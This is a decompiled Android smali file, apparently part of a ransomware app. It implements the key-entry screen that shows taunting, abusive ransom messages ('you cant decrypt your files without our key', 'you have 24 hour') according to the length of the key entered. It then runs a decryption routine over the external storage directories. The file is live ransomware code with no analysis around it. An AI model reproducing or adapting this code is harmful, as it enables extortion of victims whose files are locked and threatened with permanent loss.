.class Lcom/example/kico/myapplication/Main2Activity$1;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/kico/myapplication/Main2Activity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/widget/EditText;

.field final synthetic b:Lcom/example/kico/myapplication/Main2Activity;


# direct methods
.method constructor <init>(Lcom/example/kico/myapplication/Main2Activity;Landroid/widget/EditText;)V
    .locals 0

    iput-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    iput-object p2, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v0, 0x1

    const/4 v1, 0x5

    if-ge p1, v1, :cond_0

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v1, "you only have limited time you only have 24 hour to get back your files"

    :goto_0
    invoke-static {p1, v1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    goto/16 :goto_4

    :cond_0
    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/16 v1, 0x10

    if-ge p1, v1, :cond_1

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v1, "haha bitch you cant decrypt your files without our key"

    goto :goto_0

    :cond_1
    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/16 v1, 0x1a

    if-ge p1, v1, :cond_2

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v1, "you have 24 hour then your key will also deleted from our server"

    goto :goto_0

    :cond_2
    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/16 v1, 0x1e

    if-ge p1, v1, :cond_3

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v1, "keep trying bitch you never get back you files if if you dont have the key"

    goto :goto_0

    :cond_3
    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/16 v1, 0x23

    if-le p1, v1, :cond_4

    iget-object p1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v1, "nice try hahahhahaha but sorry its wrong key"

    goto :goto_0

    :cond_4
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object p1

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    iget-object v1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    const-string v2, "please wait we are checking your keep if your key if correct your will decrypt under 5mint automatically"

    invoke-static {v1, v2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    iget-object v0, v0, Lcom/example/kico/myapplication/Main2Activity;->k:Ljava/lang/String;

    const-string v1, "encryption11 "

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const-string v0, "/storage/emulated/0/"

    iget-object v1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/example/kico/myapplication/Main2Activity;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/util/List;

    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    iget-object v0, v0, Lcom/example/kico/myapplication/Main2Activity;->k:Ljava/lang/String;

    const-string v1, "encption01022"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/security/InvalidKeyException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_1

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_1
    :try_start_1
    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    iget-object v0, v0, Lcom/example/kico/myapplication/Main2Activity;->k:Ljava/lang/String;

    const-string v1, "encption"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "/storage/sdcard0/"

    iget-object v1, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/example/kico/myapplication/Main2Activity;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/util/List;

    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->b:Lcom/example/kico/myapplication/Main2Activity;

    iget-object v0, v0, Lcom/example/kico/myapplication/Main2Activity;->k:Ljava/lang/String;

    const-string v1, "encption0101"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_7
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_1 .. :try_end_1} :catch_6
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/security/InvalidKeyException; {:try_start_1 .. :try_end_1} :catch_4

    goto :goto_2

    :catch_4
    move-exception v0

    invoke-virtual {v0}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_2

    :catch_5
    move-exception v0

    invoke-virtual {v0}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_2

    :catch_6
    move-exception v0

    invoke-virtual {v0}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_2

    :catch_7
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_2
    :try_start_2
    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/example/kico/myapplication/Main2Activity;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/util/List;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_b
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_2 .. :try_end_2} :catch_a
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_2 .. :try_end_2} :catch_9
    .catch Ljava/security/InvalidKeyException; {:try_start_2 .. :try_end_2} :catch_8

    goto :goto_3

    :catch_8
    move-exception p1

    invoke-virtual {p1}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_3

    :catch_9
    move-exception p1

    invoke-virtual {p1}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_3

    :catch_a
    move-exception p1

    invoke-virtual {p1}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_3

    :catch_b
    move-exception p1

    invoke-virtual {p1}, Ljava/io/IOException;->printStackTrace()V

    :goto_3
    :try_start_3
    const-string p1, "/storage/sdcard/"

    iget-object v0, p0, Lcom/example/kico/myapplication/Main2Activity$1;->a:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/example/kico/myapplication/Main2Activity;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/util/List;
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_f
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_3 .. :try_end_3} :catch_e
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_3 .. :try_end_3} :catch_d
    .catch Ljava/security/InvalidKeyException; {:try_start_3 .. :try_end_3} :catch_c

    goto :goto_4

    :catch_c
    move-exception p1

    invoke-virtual {p1}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_4

    :catch_d
    move-exception p1

    invoke-virtual {p1}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_4

    :catch_e
    move-exception p1

    invoke-virtual {p1}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_4

    :catch_f
    move-exception p1

    invoke-virtual {p1}, Ljava/io/IOException;->printStackTrace()V

    :goto_4
    return-void
.end method
